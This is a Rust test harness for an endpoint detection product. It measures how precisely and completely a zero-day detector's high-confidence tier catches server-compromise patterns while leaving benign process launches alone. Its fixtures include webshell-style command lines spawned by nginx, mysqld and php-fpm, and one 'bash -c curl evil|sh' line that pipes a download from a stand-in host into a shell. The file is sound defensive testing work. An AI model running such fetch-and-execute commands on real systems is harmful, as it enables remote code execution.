//! Labeled detection corpus — a small, extensible precision/recall harness.
//!
//! The point of a detection product is measurable efficacy: how often does it
//! catch the real thing, and how often does it fire on benign activity? This
//! harness encodes that as a table of hand-verified scenarios and a runner that
//! computes precision/recall, so a change that quietly regresses detection (or
//! re-introduces a false-positive) fails CI instead of shipping.
//!
//! The metric deliberately keys on the **high-confidence tier** — the threshold
//! at or above which a detection can trigger a *destructive* auto-response
//! (KillProcess / Quarantine / Isolate; see `zeroday::tier` and
//! `response` thresholds). A detector that merely *alerts* on a weak signal is
//! not a false positive here; one that would *auto-act* on benign activity is.
//! That is the error that actually causes harm on a real fleet, and it is the
//! exact class of bug the zeroday confidence-tiering fixed.
//!
//! Extending it: add scenarios to `zeroday_scenarios()`, or add a sibling
//! `<module>_scenarios()` + test for another detector. Keep every scenario
//! hand-verified so the asserted precision/recall stays at 1.0 — a drop means a
//! real regression, not a flaky test.

use crate::types::{EventType, RawEvent};
use crate::zeroday::ZeroDayDetector;
use chrono::Utc;
use std::collections::HashMap;
use uuid::Uuid;

/// Confidence at/above which a detection can drive a destructive auto-response.
/// Matches `zeroday::tier`'s KillProcess cutoff and the response engine's
/// default `auto_kill_threshold` neighbourhood.
const HIGH_CONF: f32 = 90.0;

/// A labeled scenario: a sequence of events and whether a high-confidence
/// detection (one that could trigger a destructive auto-response) is correct.
struct Scenario {
    name: &'static str,
    events: Vec<RawEvent>,
    /// `true`  — a real threat that SHOULD reach the high-confidence tier.
    /// `false` — benign, OR a deliberately low-confidence weak signal, that must
    ///           NOT reach high confidence (so it can never auto-kill).
    expect_high_conf: bool,
}

fn exec(pid: u32, ppid: u32, name: &str, cmd: &str) -> RawEvent {
    RawEvent {
        id: Uuid::new_v4().to_string(),
        agent_id: "corpus".into(),
        hostname: "host".into(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessExec,
        pid,
        ppid,
        uid: 0,
        gid: 0,
        process_name: name.into(),
        process_path: None,
        command_line: Some(cmd.into()),
        parent_process: None,
        file_path: None,
        file_hash: None,
        network_dest_ip: None,
        network_dest_port: None,
        network_proto: None,
        syscall: None,
        return_code: None,
        container_id: None,
        namespace: None,
        extra: HashMap::new(),
    }
}

/// A parent exec followed by a child exec whose ppid resolves to the parent —
/// the shape the zeroday ancestry rules key on.
fn lineage(parent: &str, child: &str, child_cmd: &str) -> Vec<RawEvent> {
    vec![exec(100, 1, parent, parent), exec(200, 100, child, child_cmd)]
}

fn zeroday_scenarios() -> Vec<Scenario> {
    vec![
        // ── True positives: server/DB/viewer compromise → should auto-act ──
        Scenario { name: "nginx spawns bash (webshell)", events: lineage("nginx", "bash", "bash -c id"), expect_high_conf: true },
        Scenario { name: "mysqld spawns sh (UDF/injection)", events: lineage("mysqld", "sh", "sh -c whoami"), expect_high_conf: true },
        Scenario { name: "php-fpm spawns sh (webshell)", events: lineage("php-fpm", "sh", "sh -i"), expect_high_conf: true },
        Scenario { name: "evince spawns bash (malicious PDF)", events: lineage("evince", "bash", "bash -c curl evil|sh"), expect_high_conf: true },
        // ── Benign / weak signals: must NOT reach the auto-kill tier ──
        Scenario { name: "python spawns bash (routine automation)", events: lineage("python", "bash", "bash deploy.sh"), expect_high_conf: false },
        Scenario { name: "node spawns sh (build tooling)", events: lineage("node", "sh", "sh -c 'npm run build'"), expect_high_conf: false },
        Scenario { name: "sshd spawns interactive bash (normal login)", events: lineage("sshd", "bash", "bash -i"), expect_high_conf: false },
        Scenario { name: "bash spawns ls (ordinary)", events: lineage("bash", "ls", "ls -la"), expect_high_conf: false },
        Scenario { name: "systemd starts nginx (service start)", events: lineage("systemd", "nginx", "nginx"), expect_high_conf: false },
        Scenario { name: "make spawns gcc (build)", events: lineage("make", "gcc", "gcc -c main.c"), expect_high_conf: false },
    ]
}

/// Highest detection confidence the zeroday detector assigns across a scenario's
/// events (None if it never fires). A fresh detector per scenario keeps the
/// process-ancestry cache isolated.
async fn zeroday_peak_confidence(events: &[RawEvent]) -> Option<f32> {
    let d = ZeroDayDetector::new("corpus", "host");
    let mut peak: Option<f32> = None;
    for e in events {
        if let Some(t) = d.analyze(e).await {
            peak = Some(peak.map_or(t.confidence, |m| m.max(t.confidence)));
        }
    }
    peak
}

#[tokio::test]
async fn zeroday_corpus_precision_recall() {
    let scenarios = zeroday_scenarios();
    let (mut tp, mut fp, mut tn, mut fn_) = (0u32, 0u32, 0u32, 0u32);

    for s in &scenarios {
        let got_high = zeroday_peak_confidence(&s.events)
            .await
            .map(|c| c >= HIGH_CONF)
            .unwrap_or(false);
        match (s.expect_high_conf, got_high) {
            (true, true) => tp += 1,
            (false, false) => tn += 1,
            (true, false) => {
                fn_ += 1;
                eprintln!("  FALSE NEGATIVE — missed real threat: {}", s.name);
            }
            (false, true) => {
                fp += 1;
                eprintln!("  FALSE POSITIVE — would auto-act on benign: {}", s.name);
            }
        }
    }

    let precision = if tp + fp == 0 { 1.0 } else { tp as f64 / (tp + fp) as f64 };
    let recall = if tp + fn_ == 0 { 1.0 } else { tp as f64 / (tp + fn_) as f64 };
    eprintln!(
        "zeroday corpus: TP={tp} FP={fp} TN={tn} FN={fn_} | precision={precision:.3} recall={recall:.3}"
    );

    // The seed corpus is hand-verified, so both must be perfect. A regression —
    // e.g. re-flattening the confidence tiers so `python → bash` auto-kills, or
    // dropping a real server-compromise pattern — breaks one of these.
    assert_eq!(fp, 0, "high-confidence detection on a benign/weak scenario (would auto-act)");
    assert_eq!(fn_, 0, "missed a real high-confidence threat");
}
